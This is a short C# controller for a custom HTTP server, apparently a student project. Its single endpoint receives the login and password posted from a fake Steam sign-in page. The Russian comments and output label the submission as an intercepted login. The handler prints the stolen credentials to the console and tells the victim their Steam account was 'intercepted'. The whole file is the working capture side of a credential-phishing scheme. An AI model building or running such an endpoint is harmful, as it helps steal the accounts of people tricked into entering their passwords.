using MyHttpServer.Framework.Attributes;
using MyHttpServer.Framework.Results;
using System;

namespace MyHttpServer_ORIS.Controllers
{
    [HttpController("steam")]
    public class SteamController
    {
        // Этот метод поймает POST-запрос с вашей странички Steam: /steam/login
        [Post("login")]
        public IResponseResult SteamLogin(string login, string password)
        {
            Console.WriteLine("================================");
            Console.WriteLine($" [STEAM] Перехвачен вход!");
            Console.WriteLine($" Логин: {login}");
            Console.WriteLine($" Пароль: {password}");
            Console.WriteLine("================================");

            // Возвращаем простой текст или можно перенаправить обратно
            return new TextResult($"Steam аккаунт '{login}' успешно перехвачен сервером!");
        }
    }
}